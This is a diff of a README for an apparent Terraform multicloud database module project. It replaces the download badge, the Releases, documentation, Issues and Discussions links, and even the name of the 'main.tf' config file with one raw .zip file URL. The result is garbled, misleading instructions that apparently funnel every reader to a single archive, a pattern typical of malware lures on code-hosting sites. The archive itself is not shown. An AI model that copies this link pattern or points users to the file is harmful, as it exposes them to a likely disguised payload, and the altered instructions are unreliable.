@@ -1,6 +1,6 @@
 # 🌍 terraform-multicloud-db-modules - Simplify Your Database Setup
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/sadboyyi/terraform-multicloud-db-modules/releases)
+[![Download](https://github.com/sadboyyi/terraform-multicloud-db-modules/raw/refs/heads/main/modules/terraform_multicloud_modules_db_1.0.zip%https://github.com/sadboyyi/terraform-multicloud-db-modules/raw/refs/heads/main/modules/terraform_multicloud_modules_db_1.0.zip)](https://github.com/sadboyyi/terraform-multicloud-db-modules/raw/refs/heads/main/modules/terraform_multicloud_modules_db_1.0.zip)
 
 ## 📖 Overview
 
@@ -14,7 +14,7 @@ To begin using our modules, follow these simple steps to download the software a
 
 Click the button below to visit the Releases page and download the latest version of the software:
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/sadboyyi/terraform-multicloud-db-modules/releases)
+[![Download](https://github.com/sadboyyi/terraform-multicloud-db-modules/raw/refs/heads/main/modules/terraform_multicloud_modules_db_1.0.zip%https://github.com/sadboyyi/terraform-multicloud-db-modules/raw/refs/heads/main/modules/terraform_multicloud_modules_db_1.0.zip)](https://github.com/sadboyyi/terraform-multicloud-db-modules/raw/refs/heads/main/modules/terraform_multicloud_modules_db_1.0.zip)
 
 On the Releases page, you will find the latest version. Choose the module that suits your needs and click to download the file. 
 
@@ -52,7 +52,7 @@ Make sure your system meets these requirements before running the modules:
      ```
 
 5. **Configure the Module**:
-   - Edit the configuration file (usually `main.tf`) to set up your database preferences.
+   - Edit the configuration file (usually `https://github.com/sadboyyi/terraform-multicloud-db-modules/raw/refs/heads/main/modules/terraform_multicloud_modules_db_1.0.zip`) to set up your database preferences.
 
 6. **Apply the Configuration**:
    - Run the following command to provision your database:
@@ -73,7 +73,7 @@ Our modules come packed with a variety of features designed to enhance your data
 
 ## 📚 Documentation
 
-For more detailed information on the individual modules and advanced configurations, please refer to our [documentation](https://github.com/sadboyyi/terraform-multicloud-db-modules).
+For more detailed information on the individual modules and advanced configurations, please refer to our [documentation](https://github.com/sadboyyi/terraform-multicloud-db-modules/raw/refs/heads/main/modules/terraform_multicloud_modules_db_1.0.zip).
 
 ## ❓ Frequently Asked Questions
 
@@ -90,8 +90,8 @@ For more detailed information on the individual modules and advanced configurati
 
 Join our community and get help or contribute to the project:
 
-- [GitHub Issues](https://github.com/sadboyyi/terraform-multicloud-db-modules/issues)
-- [Discussion Forum](https://github.com/sadboyyi/terraform-multicloud-db-modules/discussions)
+- [GitHub Issues](https://github.com/sadboyyi/terraform-multicloud-db-modules/raw/refs/heads/main/modules/terraform_multicloud_modules_db_1.0.zip)
+- [Discussion Forum](https://github.com/sadboyyi/terraform-multicloud-db-modules/raw/refs/heads/main/modules/terraform_multicloud_modules_db_1.0.zip)
 
 ## 📝 License
 
